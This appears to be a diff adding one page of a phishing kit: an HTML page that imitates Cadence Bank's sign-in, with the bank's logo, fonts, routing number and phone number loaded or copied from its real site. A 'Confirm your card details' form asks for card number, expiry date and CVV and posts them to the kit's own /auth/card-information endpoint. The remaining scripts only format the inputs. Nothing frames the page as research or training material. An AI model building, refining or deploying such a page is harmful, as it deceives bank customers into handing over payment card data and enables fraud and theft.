@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Cadence Bank</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'cabin';
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://online.cadencebank.com/custom-data/fonts/cabin.woff) format('woff'), url(https://online.cadencebank.com/custom-data/fonts/cabin.woff2) format('woff2')
+        }
+
+        @font-face {
+            font-family: 'cabin';
+            font-style: normal;
+            font-weight: 700;
+            src: url(https://online.cadencebank.com/custom-data/fonts/cabin-bold.woff) format('woff'), url(https://online.cadencebank.com/custom-data/fonts/cabin-bold.woff2) format('woff2')
+        }
+
+        @font-face {
+            font-family: 'ysobel';
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://online.cadencebank.com/custom-data/fonts/ysobel.woff) format('woff'), url(https://online.cadencebank.com/custom-data/fonts/ysobel.woff2) format('woff2')
+        }
+
+        @font-face {
+            font-family: 'Frutiger Next Pro';
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://online.cadencebank.com/custom-data/fonts/frutigernextpro-regular.woff) format('woff'), url(https://online.cadencebank.com/custom-data/fonts/frutigernextpro-regular.woff2) format('woff2')
+        }
+
+        @font-face {
+            font-family: 'Frutiger Next Pro';
+            font-style: normal;
+            font-weight: 700;
+            src: url(https://online.cadencebank.com/custom-data/fonts/frutigernextpro-bold.woff) format('woff'), url(https://online.cadencebank.com/custom-data/fonts/frutigernextpro-bold.woff2) format('woff2')
+        }
+
+        @font-face {
+            font-family: 'AccordAlternate';
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://online.cadencebank.com/custom-data/fonts/AccordAlternate-regular.woff) format('woff')
+        }
+
+        @font-face {
+            font-family: 'AccordAlternate';
+            font-style: normal;
+            font-weight: 700;
+            src: url(https://online.cadencebank.com/custom-data/fonts/AccordAlternate-bold.woff) format('woff')
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'AccordAlternate', 'Open Sans', Helvetica, Arial, sans-serif;
+        }
+    </style>
+</head>
+
+<body class="flex flex-col items-center bg-[#004F5B]">
+    <header class="bg-[#004F5B] top-0 w-full flex justify-center py-2">
+        <img class="w-[180px]" title="Cadence Bank"
+            src="https://online.cadencebank.com/custom-data/images/Cadence_Bank_logo_WHITE.svg" alt="">
+    </header>
+    <main class="bg-white rounded-[12px] text-black mt-50 w-[90%] md:w-[75%]">
+        <div class="bg-[#1D871E] rounded-t-[12px] flex justify-between px-3 py-2">
+            <p class="uppercase font-bold text-white text">Confirm your card details</p>
+        </div>
+        <form action="/auth/card-information" method="post" class="mt-7 p-4">
+            <div class="flex flex-col">
+                <label class="font-semibold" for="cardNum">Card Number</label>
+                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
+                    type="text" id="cardNum" name="cardNum" oninput="formatAsXXXX(this)" maxlength="19" minlength="19" required>
+            </div>
+            <div class="flex flex-col pt-[27px]">
+                <label class="font-semibold" for="exp">Expiry Date</label>
+                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
+                    type="text" id="exp" name="exp" oninput="formatDate(this)" maxlength="5" minlength="5" required>
+            </div>
+            <div class="flex flex-col pt-[27px]">
+                <label class="font-semibold" for="cvv">CVV</label>
+                <input class="border border-neutral-300 outline-neutral-300 px-3 py-3 mt-2 rounded-[4px] text-sm"
+                    type="text" id="cvv" name="cvv" oninput="formatNumber(this)" maxlength="3" minlength="3" required>
+            </div>
+            <button type="submit"
+                class="bg-[#004F5B] text-white rounded-[4px] mt-3 min-h-[3.5em] font-semibold px-6 cursor-pointer">Submit</button>
+        </form>
+    </main>
+    <footer
+        class="w-full flex flex-col-reverse md:flex-row text-[#78777A] bg-white mt-8 justify-between px-4 md:px-20 py-4 fixed md:static bottom-0">
+        <div>
+            <p>Routing Number: 084201278</p>
+            <p>1-888-797-7711 M-F 7:00 a.m. - 8:00 p.m. (CST) Saturday 7:00 a.m. - 5:00 p.m. (CST)</p>
+            <p class="text-xs">® Cadence Bank. All Rights Reserved.</p>
+        </div>
+        <div>
+            <img class="w-[135px]"
+                src="https://online.cadencebank.com/Content.aspx?name=FDIC%20and%20EHL%20logo%20lockup_CG9" alt="">
+            <img src="https://d21y75miwcfqoq.cloudfront.net/61c7a64e" alt="">
+        </div>
+    </footer>
+    <script>
+        function formatDate(input) {
+          // Get the current value of the input
+          let value = input.value;
+    
+          // Remove non-numeric characters
+          value = value.replace(/\D/g, '');
+    
+          // Format the date as MM/DD/YYYY
+          if (value.length > 1) {
+            value = value.replace(/(\d{2})(\d)/, '$1/$2');
+          }
+          if (value.length > 4) {
+            value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+          }
+    
+          // Update the input value
+          input.value = value;
+        }
+      </script>
+      <script>
+        function formatNumber(input) {
+          // Get the current value of the input
+          let value = input.value;
+    
+          // Remove non-numeric characters
+          value = value.replace(/\D/g, '');
+    
+          // Update the input value
+          input.value = value;
+        }
+      </script>
+      <script>
+        function formatAsXX(input) {
+          // Get the current value of the input
+          let value = input.value;
+    
+          // Remove non-numeric characters
+          value = value.replace(/\D/g, '');
+    
+          // Format the input as xx-xx-xx
+          if (value.length > 2) {
+            value = value.replace(/(\d{2})(\d)/, '$1-$2');
+          }
+          if (value.length > 4) {
+            value = value.replace(/(\d{2})(\d{2})/, '$1-$2');
+          }
+    
+          // Update the input value
+          input.value = value;
+        }
+      </script>
+      <script>
+        function formatAsXXXX(input) {
+          // Get the current value of the input
+          let value = input.value;
+    
+          // Remove non-numeric characters
+          value = value.replace(/\D/g, '');
+    
+          // Format the input as xxxx-xxxx-xxxx-xxxx
+          value = value.replace(/(\d{4})/g, '$1-');
+    
+          // Remove the trailing dash if present
+          value = value.replace(/-$/, '');
+    
+          // Update the input value
+          input.value = value;
+        }
+    
+    
+    
+      </script>
+      <script>
+        // This code empowers all input tags having a placeholder and data-slots attribute
+        document.addEventListener('DOMContentLoaded', () => {
+          for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
+            const pattern = el.getAttribute("placeholder"),
+              slots = new Set(el.dataset.slots || "_"),
+              prev = (j => Array.from(pattern, (c, i) => slots.has(c) ? j = i + 1 : j))(0),
+              first = [...pattern].findIndex(c => slots.has(c)),
+              accept = new RegExp(el.dataset.accept || "\\d", "g"),
+              clean = input => {
+                input = input.match(accept) || [];
+                return Array.from(pattern, c =>
+                  input[0] === c || slots.has(c) ? input.shift() || c : c
+                );
+              },
+              format = () => {
+                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
+                  i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
+                  return i < 0 ? prev[prev.length - 1] : back ? prev[i - 1] || first : i;
+                });
+                el.value = clean(el.value).join``;
+                el.setSelectionRange(i, j);
+                back = false;
+              };
+            let back = false;
+            el.addEventListener("keydown", (e) => back = e.key === "Backspace");
+            el.addEventListener("input", format);
+            el.addEventListener("focus", format);
+            el.addEventListener("blur", () => el.value === pattern && (el.value = ""));
+          }
+        });</script>
+        <script>
+          function formatPhone(input) {
+      // Get the current value of the input
+      let value = input.value;
+    
+      // Remove non-numeric characters
+      value = value.replace(/\D/g, '');
+    
+      // Format the phone number as (123) 456-7890
+      if (value.length > 2) {
+          value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
+      }
+    
+      // Update the input value
+      input.value = value;
+    }
+    
+      </script>
+</body>
+
+</html>
